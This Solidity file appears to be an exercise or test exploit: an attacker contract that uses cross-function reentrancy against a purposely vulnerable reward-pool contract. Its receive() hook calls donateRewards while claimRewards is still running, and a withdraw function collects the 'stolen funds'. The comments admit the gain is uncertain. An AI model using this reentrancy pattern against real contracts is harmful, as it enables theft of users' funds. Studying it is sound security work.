// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableRewardPool.sol";

/**
 * @title RewardPoolAttacker
 * @notice Attack contract that exploits cross-function reentrancy in VulnerableRewardPool
 * 
 * ATTACK FLOW:
 * 1. Attacker deposits 10 ETH → gets 1 ETH reward
 * 2. Attacker calls claimRewards()
 * 3. claimRewards() reads: userRewards = 1 ETH, totalClaimed = 0, totalRewards = 1 ETH
 * 4. claimRewards() calculates: claimable = 1 ETH
 * 5. claimRewards() sends 1 ETH to attacker (external call)
 * 6. Attacker's receive() calls donateRewards(0.5 ETH)
 * 7. donateRewards() increases totalClaimed by 0.5 ETH (now 0.5 ETH)
 * 8. donateRewards() increases totalRewards by 0.5 ETH (now 1.5 ETH)
 * 9. claimRewards() resumes:
 *    - Sets userRewards[attacker] = 1 ETH - 1 ETH = 0 ETH
 *    - Sets totalClaimed = 0 + 1 ETH = 1 ETH (but should account for the 0.5 ETH donated!)
 * 10. State is now inconsistent, attacker can potentially claim more
 */
contract RewardPoolAttacker {
    VulnerableRewardPool public immutable rewardPool;
    uint256 public attackCount;
    bool public attacking;
    
    constructor(VulnerableRewardPool _rewardPool) {
        rewardPool = _rewardPool;
    }
    
    /**
     * @notice Start the attack
     */
    function attack() external payable {
        require(msg.value >= 10 ether, "Need at least 10 ETH");
        
        // Step 1: Deposit to accumulate rewards
        rewardPool.deposit{value: 10 ether}();
        
        // Step 2: Claim rewards (triggers reentrancy)
        attacking = true;
        rewardPool.claimRewards();
        attacking = false;
        
        attackCount++;
    }
    
    /**
     * @notice Reentrancy hook - called during claimRewards() external call
     */
    receive() external payable {
        if (attacking && address(rewardPool).balance >= 0.5 ether) {
            // Re-enter via donateRewards() - different function!
            // This modifies totalClaimed while claimRewards() is still executing
            rewardPool.donateRewards{value: 0.5 ether}(0.5 ether);
        }
    }
    
    /**
     * @notice Continue attack if needed
     */
    function continueAttack() external {
        if (rewardPool.getClaimableRewards(address(this)) > 0) {
            attacking = true;
            rewardPool.claimRewards();
            attacking = false;
        }
    }
    
    /**
     * @notice Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @notice Withdraw stolen funds
     */
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

